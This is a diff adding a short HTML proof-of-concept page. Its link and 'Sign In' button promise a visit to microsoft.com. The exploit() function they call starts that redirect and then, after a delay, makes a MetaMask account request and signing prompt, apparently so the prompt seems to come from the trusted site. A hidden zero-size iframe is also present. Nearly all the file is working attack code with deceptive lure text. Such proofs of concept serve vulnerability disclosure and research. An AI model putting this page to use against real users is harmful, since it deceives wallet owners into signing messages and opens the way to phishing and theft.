@@ -1,0 +1,61 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>HTML Elements Reference</title>
+</head>
+<body>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.7.4-rc.1/web3.min.js"></script>
+  <script>
+    /* Function to sign a message using MetaMask */
+    async function signMessage() {
+      if (window.ethereum) {
+        try {
+          await window.ethereum.request({ method: "eth_requestAccounts" });
+          window.web3 = new Web3(window.ethereum);
+          const account = web3.eth.accounts;
+          const walletAddress = account.givenProvider.selectedAddress;
+
+          if (walletAddress) {
+            const message = "This is a test message for signing.";
+            const signature = await web3.eth.personal.sign(message, walletAddress);
+            console.log(`Wallet: ${walletAddress}`);
+            console.log(`Message: ${message}`);
+            console.log(`Signature: ${signature}`);
+          } else {
+            console.log("No wallet connected");
+          }
+        } catch (error) {
+          console.error("Error signing message:", error);
+        }
+      } else {
+        console.log("No wallet detected");
+      }
+    }
+
+    function exploit() {
+      // Navigate to Microsoft.com
+      window.location.href = "https://microsoft.com";
+
+      // Run the signMessage function 2 seconds after navigation starts
+      setTimeout(() => {
+        try {
+          signMessage();
+        } catch (error) {
+          console.error("Error executing signMessage:", error);
+        }
+      }, 3500); // Delay for 2 seconds
+    }
+  </script>
+
+  <br><br><br><br>
+
+  <a href="#" onclick="exploit();">
+    <center><h1>Click here to go to https://microsoft.com</h1></center>
+  </a>
+
+  <input type="button" value="Sign In" onclick="exploit();" />
+
+  <iframe frameborder="0" style="width:0;height:0;" id="iframe" src=""></iframe>
+</body>
+</html>
